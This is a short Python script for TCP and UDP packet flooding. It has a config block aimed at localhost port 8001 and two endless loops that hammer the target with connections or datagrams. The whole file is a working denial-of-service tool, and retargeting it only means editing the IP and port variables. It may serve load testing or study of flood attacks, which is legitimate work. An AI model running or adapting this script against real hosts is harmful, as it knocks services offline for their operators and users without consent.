import socket
import random
import time

# Configuration
target_ip = "127.0.0.1"  # - Target IP (Use 'localhost')
target_port = 8001       # - Target Port (e.g., HTTP Port 80)
packet_type = "UDP"      # - Choose "TCP" or "UDP"
interval = 0.1           # - Delay Between Packets to Control the Load (Seconds) (Lower is Faster)

# - Method to Flood TCP Packets
def tcpFlood(target_ip, target_port):
    try:
        while True:
            # - Open a Socket for TCP
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            sock.connect((target_ip, target_port))
            sock.send(b"GET / HTTP/1.1\r\n") # - Example HTTP Request Payload
            sock.close()
            time.sleep(interval)
    except KeyboardInterrupt:
        print("TCP Flood has been Stopped")

# - Method to Flood UDP Packets
def udpFlood(target_ip, target_port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    payload = b"Flood" * 10 # - Example Payload
    try:
        while True:
            sock.sendto(payload, (target_ip, target_port))
            time.sleep(interval)
    except KeyboardInterrupt:
        print("UDP Flood has been Stopped")

# - Start Flooding
if packet_type == "TCP":
    print("Starting TCP flood on {}:{}".format(target_ip, target_port))
    tcpFlood(target_ip, target_port)
elif packet_type == "UDP":
    print("Starting UDP flood on {}:{}".format(target_ip, target_port))
    udpFlood(target_ip, target_port)
else:
    print("Unsupported Packet Type. Choose Either TCP or UDP.")
